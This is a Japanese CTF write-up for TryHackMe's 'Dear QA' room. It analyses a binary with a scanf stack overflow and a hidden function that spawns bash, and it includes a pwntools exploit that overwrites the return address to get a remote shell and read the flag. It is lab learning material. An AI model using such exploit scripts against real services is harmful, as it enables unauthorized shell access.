# Dear QA CTF

https://tryhackme.com/room/dearqa

実行ファイルをダウンロードできるようになっている。  
それを解析して攻撃する流れ。

## Ghidra

```c
undefined8 main(void)

{
  undefined local_28 [32];

  puts("Welcome dearQA");
  puts("I am sysadmin, i am new in developing");
  printf("What\'s your name: ");
  fflush(stdout);
  __isoc99_scanf(&DAT_00400851,local_28);
  printf("Hello: %s\n",local_28);
  return 0;
}
```

- `&DAT_00400851` は `"%s"`
- 入力データ長をチェックしていないので、スタックオーバーフローの脆弱性がある。
- strings で下記の文字列が含まれていた。

```
Congratulations!
You have entered in the secret function!
/bin/bash
```

探したら vuln 関数が見つかった。

```c
void vuln(void)

{
  puts("Congratulations!");
  puts("You have entered in the secret function!");
  fflush(stdout);
  execve("/bin/bash",(char **)0x0,(char **)0x0);
  return;
}
```

おめでとうメッセージとともに、bash を起動している。この関数の呼び出しを目指すことになる。

vuln 関数のアドレス：`0x00400686`

総合すると、スタックオーバーフローを利用して、リターンアドレスを vuln 関数のアドレスに書き換えたら、シェルを取得できると思われる。

## 5700 ポート

5700 ポートでサービスが稼働していると書かれていた。

```shell
$ nc 10.10.37.23 5700
Welcome dearQA
I am sysadmin, i am new in developing
What's your name: thm
thm
Hello: thm
```

## スタックオーバーフロー

実行ファイルにセキュリティ機構が適用されているか調べる。  
ほぼ無効になっている状態。

```shell
$ pwn checksec ./DearQA-1627223337406.DearQA
[*] '/home/kali/CTF/0410/DearQA-1627223337406.DearQA'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```

main 関数でスタック配列 32 バイト確保され、RBP の 8 バイトを考慮すると、リターンアドレスは配列の先頭から見て 40 バイトの位置にある。

40 バイトから vuln()関数のアドレスにすれば良いと考え、

```
00000000  41 41 41 41  41 41 41 41   41 41 41 41  41 41 41 41                                       AAAAAAAAAAAAAAAA
00000010  41 41 41 41  41 41 41 41   41 41 41 41  41 41 41 41                                       AAAAAAAAAAAAAAAA
00000020  41 41 41 41  41 41 41 41   86 06 40 00  00 00 00 00                                       AAAAAAAA..@.....
```

下記のように nc コマンドとリダイレクトを試したが、上手くいかなかった。

```shell
$ nc 10.10.37.23 5700 < ./payload
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�^F@^@^@^@^@^@Welcome dearQA
I am sysadmin, i am new in developing
What's your name: ^C
```

pwn ライブラリ＋ Python スクリプト  
https://musyokaian.medium.com/dear-qa-tryhackme-walkthrough-1c0a76326f8e

```python
#!/usr/bin/env pyhon3
from pwn import *
import sys

host = "10.10.37.23"
port = 5700
context(terminal = ['tmux', 'new-window'])

binary = context.binary = ELF("./DearQA-1627223337406.DearQA")
context(os = "linux", arch = "amd64")
connect = remote(host, port)
log.info("[+] Starting buffer Overflow")
connect.recvuntil(b"What's your name: ")
log.info("[+] Crafting payload")
payload = b'A' * 40
payload += p64(0x00400686)
log.info("[+] Sending Payload to the remote server")
connect.sendline(payload)
connect.interactive()
```

```shell
$ python ./exploit.py
[*] '/home/kali/CTF/0410/DearQA-1627223337406.DearQA'
    Arch:       amd64-64-little
    RELRO:      No RELRO
    Stack:      No canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        No PIE (0x400000)
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
[+] Opening connection to 10.10.37.23 on port 5700: Done
[*] [+] Starting buffer Overflow
[*] [+] Crafting payload
[*] [+] Sending Payload to the remote server
[*] Switching to interactive mode
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86^F@^@^@^@^@^@
Hello: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x86\x06@
Congratulations!
You have entered in the secret function!
bash: cannot set terminal process group (447): Inappropriate ioctl for device
bash: no job control in this shell
ctf@dearqa:/home/ctf$ $ id
id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth)
```

シェルを取れた。

```shell
ctf@dearqa:/home/ctf$ $ cat /home/ctf/flag.txt
cat /home/ctf/flag.txt
THM{..................}
```

完了

## 振り返り

- ファイルリダイレクトでペイロードを送る方法は、nc の標準入力が payload ファイルになっているため、ターミナルでコマンドを打ったところでサーバーに送信されないため方針が悪かった。
- ただ、"Congratulations!"が表示されなかったことから、vuln 関数自体呼び出されていなかったと思われるが、正確な原因は不明。
